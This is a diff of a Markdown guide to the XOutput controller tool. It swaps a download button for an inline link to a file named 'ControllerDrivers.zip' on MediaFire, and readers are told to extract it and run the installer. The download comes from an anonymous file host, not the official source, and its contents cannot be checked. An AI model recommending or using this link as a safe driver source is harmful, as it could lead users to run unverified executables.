@@ -48,11 +48,7 @@ If you have an older or unsupported game controller (gamepad, wheel, joystick, e
 ## How to Use XOutput:
 
 1. **Download XOutput**:  
-   - Visit the official website or download below.
-   - {{< button href="https://www.mediafire.com/file/792vd6s3kqhp0ug/ControllerDrivers.zip/file" >}}
-Download Here
-{{< /button >}}
-
+   - Visit the official website or [click here to download the zipped package](https://www.mediafire.com/file/792vd6s3kqhp0ug/ControllerDrivers.zip/file).
      
 2. **Install XOutput**:  
    - After downloading, extract the ZIP file and run the installer. Follow the on-screen instructions to complete the installation.
